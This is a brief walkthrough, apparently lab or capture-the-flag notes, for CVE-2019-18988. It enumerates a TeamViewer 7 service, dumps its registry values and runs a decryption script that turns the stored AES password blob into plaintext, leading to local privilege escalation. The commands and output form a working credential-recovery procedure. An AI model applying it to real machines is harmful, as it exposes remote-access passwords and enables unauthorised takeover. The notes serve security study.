# CVE-2019-18988 - TeamViewer7 - decrypt password - Local Privilege Escalation

## Enumeration

```powershell
PS C:\Temp> tasklist /svc | findstr /I teamviewer
TeamViewer_Service.exe        2248 TeamViewer7
```

```powershell
PS C:\> Get-Service TeamViewer*

Status   Name               DisplayName
------   ----               -----------
Running  TeamViewer7        TeamViewer 7
```

```powershell
PS C:\> C:\Temp\CVE-2019-18988.bat
...
    Version    REG_SZ    7.0.43148
...
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x659d58d6
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3
...
```

## Exploitation

```bash
$ cat CVE-2019-18988.py | grep 'password = "'
password = "FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B"
```

```bash
$ python3 CVE-2019-18988.py
00000000: 21 00 52 00 33 00 6D 00  30 00 74 00 65 00 21 00  !.R.3.m.0.t.e.!.
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
None
!R3m0te!
```

## Links

- [whynotsecurity - teamviewer](https://whynotsecurity.com/blog/teamviewer/)
- [teamviewer - CVE-2019-18988](https://community.teamviewer.com/t5/Announcements/Specification-on-CVE-2019-18988/td-p/82264)
- [Metasploit - TeamViewer password Module](https://github.com/rapid7/metasploit-framework/blob/master//modules/post/windows/gather/credentials/teamviewer_passwords.rb)
